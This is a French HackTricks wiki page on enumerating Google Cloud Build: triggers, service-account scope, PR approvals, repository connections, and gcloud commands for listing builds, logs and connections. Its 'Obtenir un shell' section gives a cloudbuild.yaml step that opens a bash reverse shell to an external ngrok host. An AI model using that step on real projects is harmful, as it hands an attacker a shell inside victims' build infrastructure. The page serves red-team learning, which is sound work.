# GCP - Cloud Build Enum

{% hint style="success" %}
Apprenez et pratiquez AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Informations de base

Google Cloud Build est une plateforme CI/CD g√©r√©e qui **automatise les processus de build** et de d√©ploiement de logiciels, int√©grant des **d√©p√¥ts de code source** et prenant en charge une large gamme de langages de programmation. Il **permet aux d√©veloppeurs de construire, tester et d√©ployer du code automatiquement** tout en offrant la flexibilit√© de personnaliser les √©tapes et les workflows de build.

Chaque Cloud Build Trigger est **li√© √† un Cloud Repository ou directement connect√© √† un d√©p√¥t externe** (Github, Bitbucket et Gitlab).

{% hint style="success" %}
Je n'ai trouv√© aucun moyen de voler le token Github/Bitbucket ici ou depuis Cloud Repositories car lorsque le d√©p√¥t est t√©l√©charg√©, il est acc√©d√© via une URL [https://source.cloud.google.com/](https://source.cloud.google.com/) et Github n'est pas acc√©d√© par le client.
{% endhint %}

### √âv√©nements

Le Cloud Build peut √™tre d√©clench√© si :

* **Push vers une branche** : Sp√©cifiez la branche
* **Push d'un nouveau tag** : Sp√©cifiez le tag
* **Pull request** : Sp√©cifiez la branche qui re√ßoit le PR
* **Invocation manuelle**
* **Message Pub/Sub** : Sp√©cifiez le sujet
* **√âv√©nement Webhook** : Exposera une URL HTTPS et la requ√™te doit √™tre authentifi√©e avec un secret

### Ex√©cution

Il y a 3 options :

* Un yaml/json **sp√©cifiant les commandes** √† ex√©cuter. Habituellement : `/cloudbuild.yaml`
* Un seul qui peut √™tre sp√©cifi√© "inline" dans la console web et dans le cli
* Option la plus courante
* Pertinent pour un acc√®s non authentifi√©
* Un **Dockerfile** √† construire
* Un **Buildpack** √† construire

### Permissions SA

Le **Service Account a le scope `cloud-platform`**, donc il peut **utiliser tous les privil√®ges.** Si **aucun SA n'est sp√©cifi√©** (comme lors de la soumission), le **SA par d√©faut** `<proj-number>@cloudbuild.gserviceaccount.com` sera **utilis√©.**

Par d√©faut, aucune permission n'est donn√©e mais il est assez facile de lui en donner :

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Approbations

Il est possible de configurer un Cloud Build pour **exiger des approbations pour les ex√©cutions de build** (d√©sactiv√© par d√©faut).

### Approbations PR

Lorsque le trigger est PR parce que **n'importe qui peut effectuer des PRs vers des d√©p√¥ts publics**, il serait tr√®s dangereux de simplement **permettre l'ex√©cution du trigger avec n'importe quel PR**. Par cons√©quent, par d√©faut, l'ex√©cution sera **automatique uniquement pour les propri√©taires et les collaborateurs**, et pour ex√©cuter le trigger avec les PRs d'autres utilisateurs, un propri√©taire ou un collaborateur doit commenter `/gcbrun`.

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### Connexions & D√©p√¥ts

Les connexions peuvent √™tre cr√©√©es sur :

* **GitHub** : Il affichera une invite OAuth demandant des permissions pour **obtenir un token Github** qui sera stock√© dans le **Secret Manager.**
* **GitHub Enterprise** : Il demandera d'installer un **GithubApp**. Un **token d'authentification** de votre h√¥te GitHub Enterprise sera cr√©√© et stock√© dans ce projet en tant que secret du **Secret Manager.**
* **GitLab / Enterprise** : Vous devez **fournir le token d'acc√®s API et le token d'acc√®s Read API** qui seront stock√©s dans le **Secret Manager.**

Une fois qu'une connexion est g√©n√©r√©e, vous pouvez l'utiliser pour **lier des d√©p√¥ts auxquels le compte Github a acc√®s**.

Cette option est disponible via le bouton :

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Notez que les d√©p√¥ts connect√©s avec cette m√©thode sont **uniquement disponibles dans les Triggers utilisant la 2√®me g√©n√©ration.**
{% endhint %}

### Connecter un D√©p√¥t

Ce n'est pas la m√™me chose qu'une **`connexion`**. Cela permet **diff√©rentes** fa√ßons d'obtenir **l'acc√®s √† un d√©p√¥t Github ou Bitbucket** mais **ne g√©n√®re pas un objet de connexion, mais g√©n√®re un objet de d√©p√¥t (de 1√®re g√©n√©ration).**

Cette option est disponible via le bouton :

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Stockage

Parfois, Cloud Build **g√©n√©rera un nouveau stockage pour stocker les fichiers pour le trigger**. Cela se produit par exemple dans l'exemple que GCP propose avec :
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Un bucket Storage appel√© [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) est cr√©√© pour stocker un `.tgz` avec les fichiers √† utiliser.

### Obtenir un shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
```markdown
Installer gcloud √† l'int√©rieur de cloud build :
```
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### √ânum√©ration

Vous pourriez trouver **des informations sensibles dans les configurations de build et les journaux**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Escalade de Privil√®ges

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acc√®s Non Authentifi√©

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post Exploitation

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
